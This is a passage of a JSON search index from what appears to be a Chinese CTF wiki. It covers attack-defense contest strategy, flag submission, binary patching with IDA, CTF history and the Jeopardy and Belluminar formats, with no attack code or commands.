<li>\u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u7aef\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002</li> </ol>"},{"location":"introduction/experience/","title":"\u7ebf\u4e0b\u653b\u9632\u7ecf\u9a8c\u5c0f\u7ed3","text":"<p>\u9996\u5148\uff0c\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c <code>http://172.16.4.1/Common/submitAnswer</code>\u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post  \u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f <code>Answer</code>\uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f <code>token</code> \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002</p> <p>\u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002</p>"},{"location":"introduction/experience/#gamebox","title":"\u5173\u6ce8 Gamebox \u72b6\u6001","text":"<p>\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002</p> <p>\u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a</p> <ol> <li>\u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002</li> <li>\u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down     \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u5f97\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002</li> <li>\u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002</li> <li>\u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002</li> </ol> <p>\u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002</p> <ol> <li>\u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb</li> <li>\u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002</li> </ol>"},{"location":"introduction/experience/#_2","title":"\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3","text":"<p>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002</p> <p>\u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002</p> <p>Warning</p> <p>\u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002</p>"},{"location":"introduction/experience/#patch","title":"\u670d\u52a1 patch \u4e0e\u9632\u5fa1","text":"<ol> <li>\u7a0b\u5e8f patch \u8981\u5408\u7406\u5e76\u540c\u65f6\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u5e76\u672a\u516c\u5f00\u662f check \u54ea\u91cc\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002</li> <li>\u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684     patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002</li> <li>\u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002</li> <li>\u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002</li> </ol>"},{"location":"introduction/experience/#_3","title":"\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb","text":"<p>\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002</p>"},{"location":"introduction/experience/#_4","title":"\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565","text":"<ol> <li>\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002</li> <li>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002</li> <li>\u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002</li> <li>\u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002</li> <li>\u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002</li> </ol>"},{"location":"introduction/history/","title":"CTF \u5386\u53f2","text":"<p>\u672c\u680f\u5185\u5bb9\u6458\u81ea\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u5728 i \u6625\u79cb\u4e0a\u7684\u516c\u5f00\u89c6\u9891\u300cThe Past, Present and Future of CTF\u300d\u3002</p>"},{"location":"introduction/history/#ctf_1","title":"CTF \u7684\u8d77\u6e90","text":"<p>CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7684\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002</p>"},{"location":"introduction/history/#ctf_2","title":"\u65e9\u671f CTF \u7ade\u8d5b","text":"<p>\u7b2c\u4e00\u4e2a CTF \u6bd4\u8d5b\uff081996 \u5e74-2001\u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u884c\u51c6\u5907\u4e0e\u9632\u5b88\u6bd4\u8d5b\u76ee\u6807\uff0c\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u624b\u5de5\u8ba1\u5206\u7684\u8bf7\u6c42\u3002</p> <p>\u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002</p>"},{"location":"introduction/history/#ctf_3","title":"\u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b","text":"<p>\u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002</p> <p>\u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a</p> <ul> <li>\u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u7684\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u88ab\u5ffd\u7565\u3002</li> <li>\u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002</li> <li>\u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002</li> <li>\u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u9a8c\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u884c\u7ef4\u62a4\u4ee5\u53ca\u5b89\u5168\u65b9\u9762\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002</li> </ul>"},{"location":"introduction/mode/","title":"CTF \u7ade\u8d5b\u6a21\u5f0f\u7b80\u4ecb","text":""},{"location":"introduction/mode/#-jeopardy","title":"\u89e3\u9898\u6a21\u5f0f - Jeopardy","text":"<p>\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u7c7b\u4f3c\u4e8e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u6797\u5339\u514b\u8d5b\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u8fdb\u884c\u6392\u540d\u3002</p> <p>\u4e0d\u540c\u7684\u662f\u8fd9\u4e2a\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002</p> <p>\u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002</p> <p>\u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002</p>"},{"location":"introduction/mode/#-belluminar","title":"\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar","text":"<p>\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u4e2d\u56fd\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002</p> <p>\u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/</p>"},{"location":"introduction/mode/#_1","title":"\u8d5b\u5236\u4ecb\u7ecd","text":"<p>Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF &amp; seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack.</p> <p>\u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u5206\u4eab\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\uff0c\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002</p>"},{"location":"introduction/mode/#_2","title":"\u51fa\u9898\u9636\u6bb5","text":"<p>\u6bcf\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u51fa\u4e24\u4e2aChallenge\u5230challenge\u9898\u5e93</p> <p>\u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa 2 \u9053Challange\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907Challenge\u3002\u51faChallenge\u7684\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002</p> <p>Challenge 1: must be on the Linux platform;</p> <p>Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...)</p> <p>\u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053Challenge\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2aChallenge\u5219\u4e3a\u975e Linux \u5e73\u53f0\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002</p> <p>\u4e3a\u4f7f\u6bd4\u8d5bChallenge\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51faChallenge\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684Challenge\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002</p>"},{"location":"introduction/mode/#_3","title":"\u63d0\u4ea4\u90e8\u7f72","text":"<p>\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u6587\u6863\u4e2d\u8981\u6c42\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 